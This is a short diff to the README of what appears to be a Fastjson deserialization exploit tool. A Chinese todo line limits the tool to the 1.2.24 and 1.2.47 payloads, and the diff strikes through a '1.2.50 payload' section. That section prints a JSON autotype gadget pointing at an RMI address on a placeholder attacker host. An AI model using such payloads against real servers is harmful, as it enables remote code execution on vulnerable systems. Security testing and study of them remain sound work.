@@ -22,5 +22,5 @@
 
 # todo
 高版本的payload没有加进来，只针对于1.2.24和1.2.47两个payload
-## 1.2.50 payload
-{"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://x.x.x.x:4444/Exploit","command":"a"}
+~~## 1.2.50 payload
+~~{"@type":"java.lang.AutoCloseable","@type":"oracle.jdbc.rowset.OracleJDBCRowSet","dataSourceName":"rmi://x.x.x.x:4444/Exploit","command":"a"}
